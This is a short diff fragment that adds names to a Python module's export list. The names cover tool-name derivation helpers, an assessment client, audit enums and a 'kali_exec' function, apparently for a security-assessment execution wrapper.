+    # Tool-name derivation (from kali_tool_naming)
+    "_SHELL_BINARIES",
+    "_SHELL_KEYWORDS",
+    "_analyze_tool_name",
+    "_derive_tool_name",
+    "_is_plausible_executable",
+    "_scan_inner_for_first_exec",
+    "_split_inner_pipeline_stages",
+    # Re-export AssessmentClient + audit enums for tests that patch them
+    "AssessmentClient",
+    "PROBE_KIND_ENUM",
+    "TECHNIQUE_ENUM",
+    # Public surface
+    "kali_exec",
+]
